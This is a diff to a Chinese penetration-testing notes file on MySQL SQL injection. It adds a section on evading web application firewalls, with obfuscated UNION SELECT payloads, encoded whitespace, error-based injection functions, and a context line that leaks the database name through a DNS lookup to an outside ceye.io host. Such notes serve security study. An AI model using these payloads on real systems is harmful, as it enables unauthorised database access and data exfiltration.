@@ -1,4 +1,4 @@
-# SQL注入
+# MySQLSQL注入
 
 
 ## <font color = #1E90FF>寻找SQL注入点</font>
@@ -385,4 +385,68 @@ select LOAD_FILE(CONCAT('\\\\',(select database()),'.mysql.xxxx.ceye.io\\abc'));
 	<img src="picture\SQLzhuru\二次注入1.png">
 	</figure>	
 
-	
+## <font color = #1E90FF>WAF绕过原理及分析</font>
+__熟练掌握MYSQL函数和语法使用方法+深入了解中间件运行处理机制+了解WAF防护原理及方法=随心所欲的绕过WAF防护__
+
+### <font color = #FF0000>黑盒绕过</font><BR>
+- **一.架构层绕过WAF**
+	- **1.寻找源站--->针对云WAF**
+	- **2.利用同网段--->绕过WAF防护区域**
+	- **3.利用边界漏洞--->绕过WAF防护区域**
+- **二.资源限制角度绕过WAF**
+	- **1.post大BODY**
+- **三.协议层面绕过WAF**
+	- **1.协议未覆盖绕过WAF**
+		- **请求方式变更:GET--->POST**
+		- **Content-Type变换:application/x-www-from-urlencoded;--->multipart/form-data;**
+	- **2.参数污染**
+- **四.规则层面绕过WAF（主要的绕过方式）**
+	- **1.SQL注释符绕过**
+	```
+	① Level-1: union/**/select
+	② Level-2: union/*aaaa%01bbs*/select
+	③ Level-3： union/*aaaaaaaaaa*/select
+	④ 内连注释: /*!xx*/
+	```
+	- **2.空白符绕过**
+	```
+	① MYSQL空白符: %09,%0A.%0D.%20.%0C.%A0./**/
+	② 正则的空白符: %09,%0A.%0D.%20
+	例1: union %250Cselect
+	例2: union %25A0select
+	```	
+	- **3.函数分隔符**
+	```
+	① concat%2520()
+	② concat/**/()
+	③ concat%250c()
+	④ concat%25a0()
+	```		
+	- **4.浮点数词法解析**
+	```
+	① select * from users where id=8E0 union select 1,2,3,4
+	② select * from users where id=8.0 union select 1,2,3,4
+	③ select * from users where id=\Nunion union select 1,2,3,4
+	```		
+	- **5.利用error-based进行SQL注入:Error-based SQL注入函数非常容易被忽略**
+	```
+	① extractvalue(1,concat(0x5c,md5(3)));
+	② updatexml(1,concat(0x5c,md5(3)),1);
+	③ GeometryCollection((select * from (select * from (select@@version)f)x))
+	④ polygon((select * from (select name_const(version(),1))x))
+	⑤ linestring()
+	⑥ multipoint()
+	⑦ multilinestring()
+	⑧ multipolygon()
+	```		
+	- **6.Mysql特殊语法**
+	```
+	① select {x table_name} from {x information_schema.tables};
+
+	```		
+
+### <font color = #FF0000>Fuzz绕过WAF</font><BR>
+**每一个点都能找到绕过的方法<BR>以注释绕过为例子，开始Fuzz**
+<figure class="thumbnails">
+<img src="picture\SQLzhuru\注释符绕过.png">
+</figure>
